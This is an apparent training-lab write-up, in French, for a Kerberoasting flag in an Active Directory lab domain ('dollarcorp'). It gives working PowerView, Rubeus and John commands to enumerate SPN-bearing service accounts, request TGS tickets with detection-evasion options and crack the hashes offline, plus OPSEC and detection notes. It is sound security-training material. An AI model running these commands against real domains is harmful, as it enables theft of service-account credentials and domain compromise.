---
flag: 23
machine: dcorp-dc
statut: à faire
technique: Kerberoast
LO: "[[LO14 - Kerberoasting]]"
---

# F23 · SPN kerberoasté (TGS demandé)

> [!summary] Objectif
> Identifier le SPN d'un compte de service *user* pour lequel un TGS est demandé — puis cracker le TGS offline pour récupérer le mot de passe du service (souvent DA).

## Contexte
- **Étape attack flow**: recon post-accès initial — n'importe quel compte de domaine valide suffit, aucune élévation.
- **Ce qu'on a**: session studentx dans dollarcorp, PowerView + Rubeus + John chargés dans `C:\AD\Tools\`.
- **Ce qu'on cherche**: le **SPN complet** du compte de service cible (format `Service/host.fqdn:port`) — c'est la valeur retournée par `Get-DomainUser -SPN` filtrée sur les comptes user.

## Solution

### Étape 1 — Énumérer les comptes user portant un SPN
```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```
→ Viser un compte user (pas machine), idéalement membre de *Domain Admins* — ex. `svcadmin`. Voir [[Cheatsheet - Kerberoasting]].

### Étape 2 — Demander le TGS (Rubeus, OPSEC)
```powershell
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
```
→ `/rc4opsec` évite de forcer un downgrade RC4 détectable sur un compte AES-only.

### Étape 3 — Crack offline
```powershell
# Retirer le port ':1433' du SPN dans hashes.txt avant John
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

## Réponse

| Élément | Valeur |
|---------|--------|
| SPN pour lequel un TGS est demandé | <A REMPLIR DEPUIS LAB - format MSSQLSvc/host.dollarcorp.moneycorp.local:1433> |
| Compte de service cible | <A REMPLIR DEPUIS LAB - ex. svcadmin> |
| Mot de passe cracké | <A REMPLIR DEPUIS LAB> |

## Pièges et OPSEC
- **Comptes machine = incrackables** (mot de passe aléatoire 120+ chars) — filtrer les résultats sur des SPN portés par des *users*.
- **Avant John : retirer `:1433`** du SPN dans `hashes.txt`, sinon le hash ne se charge pas. `...MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*` → `...moneycorp.local*`.
- Trace côté DC : **Event ID 4769** avec `Ticket Encryption Type = 0x17` (RC4-HMAC) — anomalie sur un tenant qui a désactivé RC4.
- Sans `/rc4opsec` : Rubeus force RC4 même sur un compte AES-only → downgrade visible dans les logs Kerberos.

## Refs
- [[Cheatsheet - Kerberoasting]]
- [[Cheatsheet - AS-REP Roasting]]
- [[Cheatsheet - Tickets Kerberos]]
- [[LO14 - Kerberoasting]]
- [[Synthèse - Kerberos]]

[[Flags - Index]] · [[Journal - Index]]
